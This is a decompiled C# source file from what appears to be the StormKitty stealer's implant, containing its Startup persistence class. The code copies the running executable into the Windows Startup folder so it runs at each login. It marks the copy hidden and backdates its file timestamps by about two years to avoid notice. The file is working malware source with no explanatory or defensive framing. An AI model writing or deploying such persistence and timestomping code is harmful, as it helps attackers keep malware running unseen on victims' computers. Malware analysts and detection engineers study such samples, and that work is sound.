using System;
using System.IO;
using System.Reflection;

namespace StormKitty.Implant
{
	// Token: 0x02000058 RID: 88
	internal sealed class Startup
	{
		// Token: 0x0600018A RID: 394 RVA: 0x0000D674 File Offset: 0x0000B874
		public static void SetFileCreationDate(string path = null)
		{
			string path2 = path ?? Startup.ExecutablePath;
			DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
			File.SetCreationTime(path2, dateTime);
			File.SetLastWriteTime(path2, dateTime);
			File.SetLastAccessTime(path2, dateTime);
		}

		// Token: 0x0600018B RID: 395 RVA: 0x0000D6C0 File Offset: 0x0000B8C0
		public static void HideFile(string path = null)
		{
			string fileName = path ?? Startup.ExecutablePath;
			new FileInfo(fileName).Attributes |= FileAttributes.Hidden;
		}

		// Token: 0x0600018C RID: 396 RVA: 0x0000D6EB File Offset: 0x0000B8EB
		public static bool IsInstalled()
		{
			return File.Exists(Startup.StartupDirectory + "\\" + Path.GetFileName(Startup.ExecutablePath));
		}

		// Token: 0x0600018D RID: 397 RVA: 0x0000D70B File Offset: 0x0000B90B
		public static void Install()
		{
			File.Copy(Startup.ExecutablePath, Startup.CopyExecutableTo);
			Startup.HideFile(Startup.CopyExecutableTo);
			Startup.SetFileCreationDate(Startup.CopyExecutableTo);
		}

		// Token: 0x0600018E RID: 398 RVA: 0x0000D730 File Offset: 0x0000B930
		public static bool IsFromStartup()
		{
			return Startup.ExecutablePath.StartsWith(Startup.StartupDirectory);
		}

		// Token: 0x0400009F RID: 159
		private static readonly string StartupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

		// Token: 0x040000A0 RID: 160
		public static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;

		// Token: 0x040000A1 RID: 161
		private static readonly string CopyExecutableTo = Startup.StartupDirectory + "\\" + Path.GetFileName(Startup.ExecutablePath);
	}
}
